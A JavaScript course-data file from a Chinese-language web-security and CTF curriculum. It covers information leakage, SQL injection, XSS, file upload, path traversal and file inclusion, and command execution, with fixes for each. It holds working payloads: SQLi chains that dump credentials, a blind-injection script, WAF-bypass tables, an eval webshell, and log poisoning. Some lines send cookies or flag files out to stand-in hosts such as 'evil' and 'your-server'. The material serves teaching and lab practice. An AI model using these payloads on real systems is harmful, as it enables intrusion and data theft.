/* PART 5 · 漏洞体系（上）：信息泄露 → SSRF */
COURSE.modules.push({
  id: "p5",
  title: "PART 7 · 漏洞体系",
  weeks: "第 10–15 周",
  summary: "18 类漏洞。每节按「原理 → 判断 → 最小复现 → 修复」写，全部要学；细节和变体去 HackTricks / seccmd 查（方法见 p6l5）。",
  lessons: [
    {
      id: "p5l1",
      title: "漏洞全景与分类",
      est: 20,
      goal: "建立一张漏洞地图：看到一个输入，就知道该翻哪一节的 payload。",
      sections: [
        { type: "p", text: "所有 Web 漏洞都长着同一张脸：<b>来自不可信来源的数据，被当成代码 / 路径 / 身份 / 请求 / 数据结构来用了。</b>区别只在「被当成什么」。记住这张表，比背 18 个名词管用。" },
        { type: "table", title: "按「被污染成什么」分类", head: ["被当成", "代表漏洞", "一句话原理"], rows: [
          ["代码", "SQLi / XSS / 命令执行 / SSTI / XXE / 反序列化", "数据被拼进了「会被执行」的位置"],
          ["路径", "路径穿越 / 文件包含 / 文件上传", "数据决定了「读/写/执行哪个文件」"],
          ["身份", "认证绕过 / JWT 伪造 / Session 伪造 / CSRF", "数据被当成了「你是谁」的凭证"],
          ["服务端请求", "SSRF", "数据变成了「让服务器替你发的请求」"],
          ["数据与流程", "信息泄露 / 逻辑漏洞 / 越权", "数据或流程本身就能被看到、被绕过"],
          ["对象结构", "原型链污染", "数据被合并进了对象的原型链"]
        ]},
        { type: "h", text: "拿到一道题，先问三个问题" },
        { type: "steps", items: [
          "<b>输入从哪进来</b>：URL 参数、表单、JSON、Cookie、请求头（Referer / XFF / UA）、文件名、甚至上传的图片内容。",
          "<b>它被送到了哪里</b>：数据库、文件系统、shell、模板引擎、反序列化函数、内网 HTTP 请求。这一步决定漏洞类型。",
          "<b>中间有没有过滤，过滤做在哪一层</b>：前端 JS（等于没有）、后端关键字替换（通常可绕）、WAF（看规则）、类型强转（最有效）。"
        ]},
        { type: "h", text: "学习顺序（不要跳）" },
        { type: "list", items: [
          "<b>先会读源码</b>：同一个 payload 在 PHP / Python / Java 里长得完全不一样，读不懂源码就只能背题。",
          "<b>再认漏洞</b>：能在一段代码里指认出「这行是注入点」，比记住 100 个 payload 有价值。",
          "<b>然后练 payload</b>：把每一类的 3–5 个标准 payload 练到能默写。",
          "<b>最后练思路</b>：真实题目不会告诉你「这是 SQL 注入」，要靠 PART 9 的决策树自己判断。"
        ]},
        { type: "note", text: "分类不是为了考试，是为了<b>检索</b>：看到「输入进了数据库」就去翻 SQLi 那节；看到「要求输入 URL」就去翻 SSRF 那节。本 PART 的每一节都按同一个结构写：原理 → 判断 → 利用 → 修复。" }
      ],
      code: [],
      labs: [{ name: "OWASP Top 10（2021）", url: "https://owasp.org/www-project-top-ten/" }],
      quiz: [
        "把 18 类漏洞按「被当成什么」分成 6 组，各写一个例子。",
        "「文件上传」和「文件包含」为什么分在不同组？",
        "为什么说「前端过滤等于没有过滤」？",
        "拿到一道陌生题目，你会先看哪三样东西？"
      ]
    },
    {
      id: "p5l2",
      title: "信息泄露",
      est: 30,
      goal: "系统化检查一个站「不该给的东西」，并会把泄露变成下一步的入口。",
      sections: [
        { type: "p", text: "信息泄露本身往往不是最终目的，而是<b>解题的钥匙</b>：拿到源码就知道漏洞在哪，拿到备份就知道数据库结构，拿到 .git 就拿到了整个历史版本。CTF 里 90% 的「这题好难」其实是「我还没找到泄露点」。" },
        { type: "table", title: "常见泄露点清单", head: ["位置", "典型对象", "拿到之后能干什么"], rows: [
          ["前端", "HTML 注释、隐藏 input、内联 JS 常量、source map", "直接读 flag / 找到隐藏接口"],
          ["源码备份", "www.zip、web.zip、index.php.bak、.index.php.swp", "审计出真正的漏洞点"],
          ["版本库", ".git/、.svn/、.hg/", "还原全部历史源码"],
          ["配置", ".env、config.php、composer.json、package.json", "数据库账号、密钥、依赖版本"],
          ["调试", "/debug、/console、actuator/env、phpinfo.php、错误堆栈", "环境变量、路径、内存信息"],
          ["目录", "robots.txt、/admin/、/backup/、目录列表", "发现后台与备份"],
          ["指纹", "X-Powered-By、Server、静态资源 hash、Cookie 名", "判断框架与版本，选对应的利用链"]
        ]},
        { type: "h", text: "动手：五分钟基线检查" },
        { type: "steps", items: [
          "看响应头：<code>curl -I</code>，记下 Server / X-Powered-By / Set-Cookie，判断语言与框架。",
          "看 robots.txt 与 sitemap.xml：管理员路径、备份目录经常就写在这里。",
          "看页面源码：Ctrl+F 搜 <code>flag</code>、<code>api</code>、<code>key</code>、<code>token</code>、<code>password</code>。",
          "猜备份文件：常见命名 <code>www.zip</code>、<code>web.zip</code>、<code>backup.zip</code>、<code>index.php.bak</code>、<code>.index.php.swp</code>，用 dirsearch 批量跑。",
          "试版本库：<code>/.git/config</code> 返回 200 就是泄露，用 GitHack / git-dumper 拉全量。",
          "看错误：故意传一个非法参数触发报错，报错里常带绝对路径、框架版本、SQL 语句。"
        ]},
        { type: "code", lang: "bash", title: "最常用的几个探测", src: `curl -I https://target/                     # 响应头指纹
curl https://target/robots.txt
curl https://target/.git/config              # 200 = Git 泄露
curl https://target/www.zip -o a.zip -s -w "%{http_code}\\n"
curl https://target/index.php.bak -s -w "%{http_code}\\n"

# 目录扫描（合法靶场上用）
dirsearch -u https://target/ -e php,bak,zip,txt,swp` },
        { type: "code", lang: "bash", title: "Git 泄露的利用", src: `# 方案一：GitHack（Python2，按目录还原）
python GitHack.py http://target/.git/

# 方案二：git-dumper（更稳，推荐）
git-dumper http://target/.git/ ./src_leak

# 还原之后看历史记录，flag 常在已经"删掉"的提交里
cd src_leak && git log --all --oneline && git show <commit>` },
        { type: "h", text: "source map 为什么危险" },
        { type: "p", text: "打包工具会把多个源文件压缩成一个 <code>app.min.js</code>，同时生成 <code>app.min.js.map</code> 记录「每个字符来自哪个源文件」。这个 .map 一旦留在线上，压缩代码就等于源码全公开——变量名、注释、甚至你没打算发布的调试逻辑都回来了。F12 → Sources 里能看到原文件列表，就是这个 .map 生效了。" },
        { type: "h", text: "修复" },
        { type: "list", items: [
          "上线前删除 <code>.git</code>、<code>.svn</code>、<code>.DS_Store</code>、备份文件、编辑器的 swap 文件。",
          "生产环境关闭详细报错（PHP: <code>display_errors=Off</code>），错误写日志而不是打印给用户。",
          "source map 不要随静态资源一起发布，或放在访问不到的位置。",
          "敏感配置（数据库密码、密钥）只放在服务端环境变量里，永不进前端。",
          "给 <code>/admin</code>、<code>/backup</code> 这类目录加访问控制，别指望「没人知道这个路径」。"
        ]},
        { type: "note", text: "信息收集要有边界：以上探测只在<b>自己搭的靶场</b>或<b>明确授权</b>的目标上做。对真实站点做目录扫描，在大多数国家和地区都需要书面授权。" }
      ],
      code: [],
      labs: [
        { name: "CTFHub · 信息泄露专项（Git/备份/目录）", url: "https://www.ctfhub.com/" },
        { name: "dirsearch（目录扫描）", url: "https://github.com/maurosoria/dirsearch" }
      ],
      quiz: [
        "为什么 .git 泄露比一个 .zip 备份更危险？",
        "source map 泄露的是什么信息？怎么在浏览器里确认它生效了？",
        "robots.txt 为什么会成为情报来源？它本来的用途是什么？",
        "写出三个常见的源码备份文件名。",
        "生产环境应该怎么处理报错信息？"
      ]
    },
    {
      id: "p5l3",
      title: "SQL 注入（上）：原理与联合查询",
      est: 40,
      goal: "理解拼接为什么危险，会判断字段数、找显位、用 UNION 把数据取出来。",
      sections: [
        { type: "p", text: "SQL 注入的本质只有一句话：<b>用户输入变成了 SQL 语句的一部分，而不是一个值。</b>下面这段代码在 PHP 里极其常见：「把 id 拼进查询字符串」。" },
        { type: "code", lang: "php", title: "漏洞是怎么产生的", src: `<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";   // 直接拼接
$row = mysqli_query($conn, $sql);

// 正常请求：?id=1
//   SELECT * FROM users WHERE id = 1

// 攻击请求：?id=1 OR 1=1
//   SELECT * FROM users WHERE id = 1 OR 1=1      -> 全表返回
?>` },
        { type: "p", text: "注意这个变化：<b>1</b> 是一个值，<b>1 OR 1=1</b> 是三个值加一个条件。拼接之后，数据库看到的已经不是「一个数字」，而是一段带逻辑的语句。这就是注入成立的根。" },
        { type: "h", text: "判断注入：四步都做完再下结论" },
        { type: "steps", items: [
          "<b>加引号看报错</b>：<code>?id=1'</code> 出现 SQL 语法报错 → 大概率是字符型注入。",
          "<b>比较真假</b>：<code>?id=1 and 1=1</code> 与 <code>?id=1 and 1=2</code> 的响应内容/长度不同 → 注入成立。",
          "<b>判断类型</b>：数字型（<code>id=1</code>）、字符型（<code>id='1'</code>）、搜索型（<code>like '%1%'</code>）；字符型要闭合引号。",
          "<b>判断字段数</b>：<code>order by 1</code> 到 <code>order by N</code>，直到报错，N-1 就是字段数。"
        ]},
        { type: "code", lang: "sql", title: "标准利用步骤（MySQL）", src: `?id=1 order by 3 --            字段数 = 3
?id=-1 union select 1,2,3 --    找显位（-1 让前一条空，页面才会显示 union 的结果）
?id=-1 union select 1,database(),3 --
?id=-1 union select 1,user(),3 --
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --` },
        { type: "table", title: "每一步在问什么", head: ["目的", "payload 关键部分", "为什么这样写"], rows: [
          ["判断字段数", "order by N", "按第 N 列排序，列不存在就报错"],
          ["让原查询为空", "id=-1", "否则原记录占满页面，union 的结果显示不出来"],
          ["找显位", "union select 1,2,3", "看页面哪个位置回显了数字，那个位置就是输出点"],
          ["看库名版本", "database() / version()", "先确认权限与环境"],
          ["看表名", "information_schema.tables", "MySQL 自带的元数据表，存着所有表和列"],
          ["看列名", "information_schema.columns", "同上，定位目标表结构"],
          ["取值", "group_concat(a,0x3a,b)", "0x3a 是冒号，把用户名和密码拼成一行"]
        ]},
        { type: "h", text: "为什么「过滤关键字」不是修复" },
        { type: "p", text: "如果只把 <code>select</code>、<code>union</code> 替换成空，攻击者用 <code>SeLeCt</code>、<code>sel/**/ect</code>、<code>/*!50000select*/</code> 就能绕过。根本原因是<b>SQL 语句本身参与了字符串拼接</b>，只要结构还能被输入改变，绕过只是成本问题。" },
        { type: "code", lang: "php", title: "正确修复：参数化查询", src: `<?php
// PDO 预处理：SQL 结构先定死，参数后传进去
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$row = $stmt->fetch();

// mysqli 预处理
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);      // i = 整数，类型强转
$stmt->execute();
?>` },
        { type: "note", text: "参数化查询的关键不是「过滤了危险字符」，而是<b>数据库永远只把参数当值，不当语法</b>。同样的原理也适用于所有 ORM：用占位符，不要用字符串拼 SQL。" }
      ],
      code: [],
      labs: [
        { name: "SQLi-Labs Less-1 ~ Less-4（联合查询）", url: "https://github.com/skyous/sqli-labs" },
        { name: "PortSwigger · SQL Injection", url: "https://portswigger.net/web-security/sql-injection" }
      ],
      quiz: [
        "order by 为什么能判断字段数？报错前一个数字代表什么？",
        "union select 前面为什么要用 -1 或 and 1=2？",
        "information_schema 是什么？为什么它能查到所有表名？",
        "为什么「把 select 这个词过滤掉」挡不住注入？",
        "用 PDO 写一遍安全的查询代码。"
      ]
    },
    {
      id: "p5l4",
      title: "SQL 注入（下）：盲注、报错、绕过",
      est: 45,
      goal: "页面不回显时，仍能通过布尔、时间、报错三条路把数据一点点取出来，并知道什么时候必须写脚本。",
      sections: [
        { type: "p", text: "真实题目里，注入点常常「不回显」：页面只有「用户存在 / 不存在」两个状态，或者干脆只给一个正常页面。这时要把数据库当成一个<b>只能回答是/否的黑盒</b>，用问题一位一位地把数据问出来。" },
        { type: "code", lang: "sql", title: "布尔盲注：看真假", src: `?id=1 and length(database())=4 --           库名长度是不是 4
?id=1 and substr(database(),1,1)='a' --      第 1 个字符是不是 a
?id=1 and ascii(substr(database(),1,1))>97 -- 用 ASCII 区间做二分，快得多` },
        { type: "code", lang: "sql", title: "时间盲注：看延时", src: `?id=1 and if(length(database())=4,sleep(3),0) --
?id=1 and if(ascii(substr(database(),1,1))>97,sleep(3),0) --

# 其他数据库
SQL Server: ;waitfor delay '0:0:3' --
PostgreSQL: ;select pg_sleep(3) --` },
        { type: "code", lang: "sql", title: "报错注入：看报错回显", src: `# MySQL（5.1–5.7 常见，需报错信息回显）
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) --
?id=1 and extractvalue(1,concat(0x7e,(select database()))) --

# 原理：把查询结果拼进报错信息里，报错被回显到页面
# 0x7e 是 ~，用来分隔数据方便提取` },
        { type: "table", title: "三条路怎么选", head: ["手法", "依赖条件", "速度", "什么时候用"], rows: [
          ["联合查询", "有回显、字段数已知", "最快", "页面会把查询结果打印出来"],
          ["报错注入", "报错信息回显到页面", "快", "有回显但只有报错，或 union 被拦"],
          ["布尔盲注", "页面有「真/假」两种可区分的状态", "中", "无回显，但响应有差异（长度/内容/状态码）"],
          ["时间盲注", "什么都看不出来，只能靠响应时间", "最慢", "以上全不行，最后的办法"]
        ]},
        { type: "code", lang: "python", title: "布尔盲注脚本骨架", src: `import requests, string

url = "http://target/?id=1"
chars = string.ascii_lowercase + string.digits + "_{}-"
result = ""

for pos in range(1, 40):
    for ch in chars:
        payload = f"1' and substr(database(),{pos},1)='{ch}' -- "
        r = requests.get(url, params={"id": payload})
        if "存在" in r.text:          # 用页面上的"真"信号判断
            result += ch
            print(pos, ch, result)
            break
    else:
        break

print("命中:", result)` },
        { type: "note", text: "盲注必须脚本化。手工逐位猜 20 个字符要几百次请求，写脚本 20 行就搞定——这正是 PART 4 讲 Python 的原因。二分法（先判断 ASCII 范围再缩小）比逐字符遍历快 5 倍以上。" },
        { type: "h", text: "WAF 绕过的常见手法" },
        { type: "table", title: "绕过对照表", head: ["被拦的东西", "绕过写法", "说明"], rows: [
          ["大小写", "SeLeCt / UnIoN", "很多正则不忽略大小写"],
          ["空格", "sel/**/ect、%09、%0a、+", "注释和空白符都能当分隔"],
          ["关键字", "sel/**/ect、双写 selselectect", "替换时只替换一次就能绕过"],
          ["内联注释", "/*!50000select*/", "MySQL 特有，注释里的内容会被执行"],
          ["引号", "0x61646d696e（十六进制）", "避免出现引号被过滤"],
          ["and/or", "&& / || / xor", "运算符等价替换"],
          ["等号", "like、regexp、in、between", "同样的语义换函数"]
        ]},
        { type: "code", lang: "bash", title: "sqlmap 的定位：省力的工具，不是替代理解", src: `# 先手工确认注入点和参数，再用工具放大
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" -D dbname --tables
sqlmap -u "http://target/?id=1" -D dbname -T users --dump

# 请求有 Cookie / 头时，用请求文件更省事
sqlmap -r req.txt -p id --batch --level 3 --risk 2` },
        { type: "note", text: "比赛里 sqlmap 常常被 WAF 拦。真正稳定的路线是：<b>先判断注入类型 → 先试 union / 报错 → 不行再写盲注脚本</b>。工具帮你省时间，但不能帮你绕过你没理解的东西。" }
      ],
      code: [],
      labs: [
        { name: "SQLi-Labs Less-8 ~ Less-17（盲注 / 报错专区）", url: "https://github.com/skyous/sqli-labs" },
        { name: "PortSwigger · Blind SQL injection", url: "https://portswigger.net/web-security/sql-injection/blind" }
      ],
      quiz: [
        "布尔盲注和时间盲注最核心的区别是什么？",
        "报错注入依赖什么前提？updatexml 在这里起什么作用？",
        "二分法为什么比逐字符遍历快？",
        "列出三种把空格绕过去的方法。",
        "为什么盲注场景必须写脚本？"
      ]
    },
    {
      id: "p5l5",
      title: "XSS：反射、存储、DOM",
      est: 45,
      goal: "分清三类 XSS 的触发路径，能根据 payload 落点选择正确写法。",
      sections: [
        { type: "p", text: "XSS 的本质和 SQL 注入一模一样：<b>用户输入被当成 HTML/JS 代码，交给了浏览器执行。</b>区别在于执行的战场从数据库换成了浏览器——所以危害从「读数据」变成「以你的身份干任何事」。" },
        { type: "table", title: "三类对比", head: ["类型", "数据路径", "触发时机", "典型场景"], rows: [
          ["反射型", "输入 → 服务器 → 立刻写回响应 → 浏览器执行", "受害者点开构造好的链接", "搜索结果页、错误提示回显参数"],
          ["存储型", "输入 → 数据库 → 别人访问页面时取出执行", "任何人打开页面就中招", "留言板、昵称、评论、工单"],
          ["DOM 型", "输入 → 前端 JS 直接写进 DOM（不经过服务器）", "页面内 JS 处理 URL/hash 时", "document.write(location.hash)、innerHTML"]
        ]},
        { type: "p", text: "三者的区别决定了「怎么验证」：反射型和存储型会在服务器响应里看到 payload，DOM 型往往看不到——因为 payload 从头到尾都在浏览器里流转，服务器日志里只有一段正常的 URL。" },
        { type: "h", text: "先判断落点，再选 payload" },
        { type: "table", title: "上下文 → payload", head: ["落点位置", "payload 思路", "示例"], rows: [
          ["HTML 正文", "直接插标签", "&lt;script&gt;alert(1)&lt;/script&gt;、&lt;img src=x onerror=alert(1)&gt;"],
          ["属性值里（双引号）", "先闭合属性再插事件", "\" onmouseover=\"alert(1)"],
          ["属性值里（单引号）", "同上，换单引号", "' onfocus='alert(1)' autofocus='"],
          ["&lt;script&gt; 内部字符串", "闭合 script 标签", "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"],
          ["href / src", "伪协议", "javascript:alert(1)"],
          ["CSS / style 里", "expression / 类 CSS 注入", "看浏览器版本，现代浏览器基本堵死"],
          ["JSON 回显", "先看是否 text/html 渲染", "{\"name\":\"&lt;img src=x onerror=alert(1)&gt;\"}"]
        ]},
        { type: "code", lang: "php", title: "存储型最小复现（留言板）", src: `<?php
// 后端：把用户输入直接存库、直接输出
$msg = $_POST['msg'];
mysqli_query($conn, "INSERT INTO board(msg) VALUES('$msg')");

// 页面渲染
echo "<div class='msg'>" . $row['msg'] . "</div>";
// 输入 <img src=x onerror=alert(document.cookie)>
// 之后每个访问留言板的人都会执行它
?>` },
        { type: "code", lang: "js", title: "DOM 型最小复现", src: `// 页面里写了这样一段（很常见）
var name = location.hash.slice(1);
document.getElementById("hello").innerHTML = "你好，" + name;

// 访问：http://target/#<img src=x onerror=alert(1)>
// 服务器完全没参与，日志里只有一条正常请求` },
        { type: "h", text: "拿到 XSS 之后能干什么" },
        { type: "list", items: [
          "<b>偷 Cookie</b>：<code>new Image().src='http://evil/'+document.cookie</code>（HttpOnly 的 Cookie 读不到）。",
          "<b>发请求</b>：以受害者身份调用任意接口，绕开 CSRF Token（因为脚本就在同源页面里）。",
          "<b>改页面</b>：伪造登录框钓密码，或把转账按钮改成「领红包」。",
          "<b>读 DOM</b>：页面里渲染出来的敏感信息、前端存的 token，全都能读走。"
        ]},
        { type: "h", text: "修复：输出编码 + 纵深防御" },
        { type: "code", lang: "php", title: "按上下文转义", src: `<?php
// HTML 正文 / 属性：htmlspecialchars
echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');

// JS 字符串里：json_encode 而不是手拼引号
echo "<script>var name = " . json_encode($msg) . ";</script>";

// URL 里：urlencode
echo "<a href='?q=" . urlencode($q) . "'>搜索</a>";
?>` },
        { type: "note", text: "三道防线缺一不可：<b>输出时按上下文编码</b>（根治）、<b>HttpOnly</b>（Cookie 偷不走）、<b>CSP</b>（就算漏了也执行不了内联脚本）。前端框架的 <code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>v-html</code> 都是新雷区。" }
      ],
      code: [],
      labs: [
        { name: "XSS-Labs（1–20 关）", url: "https://github.com/do0dl3/xss-labs" },
        { name: "PortSwigger · XSS", url: "https://portswigger.net/web-security/cross-site-scripting" }
      ],
      quiz: [
        "存储型和反射型的最大区别是什么？为什么存储型危害更大？",
        "DOM 型 XSS 为什么在服务器日志里看不到 payload？",
        "payload 落在 &lt;script&gt; 内部的字符串里，和落在 HTML 正文里，写法有什么不同？",
        "HttpOnly 能防住 XSS 吗？它防住了什么？",
        "写出 PHP 里按上下文转义的三种做法。"
      ]
    },
    {
      id: "p5l6",
      title: "文件上传",
      est: 40,
      goal: "掌握五类上传校验的绕过方式，理解「能传上去」和「能执行」的区别。",
      sections: [
        { type: "p", text: "文件上传漏洞的价值不在「传上去了」，而在「<b>传上去的文件能被服务器当代码执行</b>」。所以每道上传题的核心问题永远是：服务器会不会执行我传的这个文件？" },
        { type: "table", title: "五道关，逐一突破", head: ["检查点", "它怎么拦", "怎么绕"], rows: [
          ["前端 JS 校验", "onchange 检查后缀", "直接改包（Burp / curl），或删掉页面上的 JS"],
          ["Content-Type", "要求 image/png", "改请求里的 Content-Type，不影响真实内容"],
          ["后缀黑名单", "禁止 .php", ".php3 .phtml .pht .phps .pHp；Windows 的 .php. 与 .php::$DATA"],
          ["后缀白名单", "只允许 .jpg", "解析漏洞：Apache 多后缀 a.php.jpg、Nginx 配置错误、/1.php/. 路径穿越"],
          ["内容/文件头检测", "检查 magic bytes", "图片马（GIF89a + PHP 代码）+ 文件包含；或二次渲染绕过"]
        ]},
        { type: "code", lang: "php", title: "典型的不安全上传后端", src: `<?php
// 只检查了后缀黑名单
$name = $_FILES['file']['name'];
$ext  = strtolower(substr($name, strrpos($name, '.')));
$blocked = ['php', 'php5', 'php7'];

if (!in_array($ext, $blocked)) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $name);
    echo "上传成功：" . $name;
} else {
    echo "不允许的类型";
}
?>` },
        { type: "h", text: "绕过流程" },
        { type: "steps", items: [
          "先传一个正常的 jpg 确认功能可用，记住返回的访问路径。",
          "改成 <code>shell.php</code> 传，看拦截信息 —— 是前端弹窗（改包就能过）还是后端报错（要换后缀）。",
          "换后缀：<code>.phtml</code>、<code>.php3</code>、<code>.phps</code>、<code>.pht</code>，逐个试到能上传。",
          "还不行就试 <code>shell.php.jpg</code>（解析漏洞）、<code>shell.php%00.jpg</code>（老版本截断）、<code>shell.php.</code>（Windows 去点）。",
          "传上去之后，访问返回的路径，看是否被解析执行。<b>不能执行就只是存了个文件，不算 getshell。</b>"
        ]},
        { type: "code", lang: "bash", title: "图片马 + 文件包含", src: `# 把 PHP 代码藏在图片里，图片本身仍然能正常显示
copy normal.gif shell.php
echo "<?php @eval($_POST['c']); ?>" >> shell.php

# 单靠图片马不够，还要有文件包含把这个"图片"当 PHP 执行
# ?page=uploads/shell.gif
# 或者 .htaccess / .user.ini 让 .gif 被当 PHP 解析` },
        { type: "code", lang: "text", title: ".htaccess 与 .user.ini", src: `# .htaccess（Apache）：让所有 .jpg 按 PHP 解析
AddType application/x-httpd-php .jpg

# .user.ini（PHP-FPM）：在每个请求前自动包含你的文件
auto_prepend_file=shell.jpg

# 条件竞争：先上传到临时目录再检查/删除
# 趁检查前的窗口期，用多线程疯狂访问，抢在被删之前执行` },
        { type: "h", text: "修复" },
        { type: "list", items: [
          "<b>白名单后缀</b>，白名单要包含解析顺序（只留 .jpg/.png/.gif）。",
          "<b>重命名</b>：用随机文件名 + 固定后缀，别用用户给的名字。",
          "<b>上传目录禁止执行</b>：Nginx 里 <code>location ~ \\.(php)$ { deny all; }</code>，Apache 用 <code>php_flag engine off</code>。",
          "<b>校验内容</b>：magic bytes + 图片二次渲染；但内容校验也不是万能，最好配合「不执行」。",
          "<b>存储分离</b>：文件放对象存储/CDN，Web 服务根目录根本访问不到。"
        ]},
        { type: "note", text: "上传题最省时间的做法：<b>先用 Burp 抓到上传请求，之后所有测试都在 Repeater 里改包重放</b>，不要在浏览器里反复点。改后缀、改 Content-Type、改文件名都是同一件事：改一个字段，发一次。" }
      ],
      code: [],
      labs: [
        { name: "Upload-Labs（1–21 关）", url: "https://github.com/c0ny1/upload-labs" },
        { name: "PortSwigger · File upload", url: "https://portswigger.net/web-security/file-upload" }
      ],
      quiz: [
        "前端校验为什么等于没有校验？",
        "上传成功之后，怎么判断这次算不算真正利用了漏洞？",
        ".htaccess 上传能实现什么效果？它需要什么前提？",
        "图片马为什么要配合文件包含才有效？",
        "列出三条上传漏洞的修复措施。"
      ]
    },
    {
      id: "p5l7",
      title: "路径穿越与文件包含",
      est: 35,
      goal: "理解「用户控制路径」的两种危害：读任意文件、执行任意代码。",
      sections: [
        { type: "p", text: "「用户能控制路径」听起来无害，但它同时意味着两件事：<b>能读到不该读的文件</b>（路径穿越），以及<b>能包含不该包含的文件</b>（文件包含，最终常常变成代码执行）。" },
        { type: "code", lang: "php", title: "路径穿越：下载功能", src: `<?php
// 设计意图：只允许下载 files/ 目录下的报告
$file = $_GET['file'];
readfile("./files/" . $file);
?>

# 正常：?file=report.pdf
# 攻击：?file=../../../../etc/passwd
# 攻击：?file=../../../../var/www/html/config.php   （读源码找数据库密码）` },
        { type: "table", title: "过滤与绕过", head: ["过滤方式", "绕过写法"], rows: [
          ["过滤 ../", "....// （删掉 ../ 后剩下 ../）、..%2f、..%252f（二次解码）"],
          ["过滤绝对路径", "不给绝对路径，用层层 ../ 走上去"],
          ["只允许前缀目录", "..\\..\\ （Windows 反斜杠）、%5c"],
          ["检查后缀", "a.php%00.jpg（老版本 PHP 截断）、路径末尾加点/空格（Windows）"],
          ["WAF 拦 ../", "编码变形：%2e%2e%2f、..%c0%af（畸形编码）"]
        ]},
        { type: "code", lang: "php", title: "文件包含：把路径交给 include", src: `<?php
$page = $_GET['page'];
include("./pages/" . $page . ".php");

// 正常：?page=about        -> include ./pages/about.php
// 读源码（不执行）：?page=php://filter/convert.base64-encode/resource=index
// 远程代码（需 allow_url_include=On）：?page=http://evil.com/shell.txt
// 日志包含：?page=../../../../var/log/apache2/access.log
?>` },
        { type: "table", title: "PHP 伪协议速查", head: ["协议", "用途", "前提"], rows: [
          ["php://filter", "读文件源码（base64 编码后返回）", "任意 PHP 版本"],
          ["php://input", "读 POST 原始体，可配合 auto_prepend 执行", "allow_url_include=On"],
          ["data://", "把数据当文件包含，直接执行代码", "allow_url_include=On"],
          ["expect://", "直接执行命令", "装了 expect 扩展"],
          ["http(s)://", "远程包含，代码在远程服务器上", "allow_url_include=On"],
          ["zip:// / phar://", "包含压缩包内文件；phar 还能触发反序列化", "通常默认可用"]
        ]},
        { type: "code", lang: "bash", title: "日志包含：把代码写进日志再包含它", src: `# 1. 让访问日志里出现 PHP 代码（UA 或 URL 里带）
curl -A "<?php system('id'); ?>" http://target/

# 2. 包含日志文件，代码被执行
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/nginx/access.log

# 也可以用 /proc/self/environ（环境变量里塞代码）` },
        { type: "p", text: "包含的利用深度完全取决于配置：<code>allow_url_include=On</code> 才能远程包含，<code>open_basedir</code> 会限制目录范围。所以拿到包含点后<b>先读 phpinfo 或配置，再决定用哪种方式</b>，不要一上来就试远程包含。" },
        { type: "note", text: "修复其实很简单，两步：<b>用白名单映射</b>（请求的 key 对应固定的真实路径，而不是把用户输入拼进路径），<b>用 realpath 校验</b>（拼完之后解析出真实绝对路径，确认它仍在允许目录内）。文件包含还应禁用远程包含。" }
      ],
      code: [],
      labs: [
        { name: "CTFHub · 文件包含 / 路径穿越", url: "https://www.ctfhub.com/" },
        { name: "PortSwigger · Path traversal", url: "https://portswigger.net/web-security/file-path-traversal" }
      ],
      quiz: [
        "php://filter 为什么能读源码而不执行它？",
        "../ 被过滤成空之后，还有什么写法？",
        "远程包含需要哪个配置项？为什么默认是关闭的？",
        "日志包含利用了哪个特性？为什么它能变成代码执行？",
        "用白名单 + realpath 写出安全的文件读取代码。"
      ]
    },
    {
      id: "p5l8",
      title: "命令执行与代码执行",
      est: 40,
      goal: "分清「执行系统命令」和「执行语言代码」，掌握分隔符、过滤绕过与无回显处理。",
      sections: [
        { type: "p", text: "这两类漏洞的注入内容不同：命令执行注入的是 <b>shell 语法</b>，代码执行注入的是 <b>目标语言的代码</b>。同一个输入口，后面挂的函数不同，利用方式就完全不同。" },
        { type: "table", title: "两者的区别", head: ["类型", "典型函数", "注入内容", "例子"], rows: [
          ["命令执行", "system / exec / shell_exec / passthru / 反引号", "shell 命令与分隔符", "127.0.0.1; cat /flag"],
          ["代码执行", "eval / assert / create_function / preg_replace 的 /e", "目标语言代码", "phpinfo(); 或 system('cat /flag');"]
        ]},
        { type: "code", lang: "php", title: "漏洞代码与修复", src: `<?php
// 危险：把用户输入拼进命令
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
//  ?ip=127.0.0.1; cat /flag
//  ?ip=127.0.0.1 | cat /flag

// 正确：先校验格式，再转义参数
if (!filter_var($ip, FILTER_VALIDATE_IP)) die("非法 IP");
system("ping -c 1 " . escapeshellarg($ip));
?>` },
        { type: "table", title: "命令分隔与绕过", head: ["被过滤的", "替代写法", "备注"], rows: [
          ["分隔符 ;", "|  ||  &  &&  换行(%0a)", "管道会把前面输出喂给后面"],
          ["空格", "$IFS、%09、$IFS$9、{cat,/etc/passwd}", "花括号展开不需要空格"],
          ["关键字 cat", "ca\"\"t、c\\at、tac、nl、more、head", "引号和反斜杠插入"],
          ["关键字 flag", "/fl''ag、/fl\\ag、通配符 /fl*", "shell 会还原"],
          ["路径 /", "cd / && cat flag、$PWD 拼接", "或者直接相对路径"],
          ["命令回显被过滤", "先写到文件再访问、外带 DNS/HTTP", "无回显场景"]
        ]},
        { type: "h", text: "无回显的四种处理" },
        { type: "steps", items: [
          "<b>写文件</b>：<code>cat /flag > /var/www/html/1.txt</code>，再访问 <code>/1.txt</code>。",
          "<b>带外 HTTP</b>：<code>curl http://your-server/?x=$(cat /flag | base64)</code>，在自己服务器上看日志。",
          "<b>DNSLog</b>：<code>nslookup $(cat /flag).your.dnslog.cn</code>，用 DNS 查询把数据带出去（很多 WAF 允许出站 DNS）。",
          "<b>时间侧信道</b>：<code>sleep $(cat /flag | cut -c1)</code>，靠响应时间判断一个字符（很慢，但什么通道都没有时能用）。"
        ]},
        { type: "note", text: "最常见的误区：看到命令执行就急着 <code>cat /flag</code>。先确认三件事——<b>回显有没有、flag 在哪、有没有出网</b>。路径不对就先 <code>ls /</code>、<code>find / -name 'flag*'</code>。" }
      ],
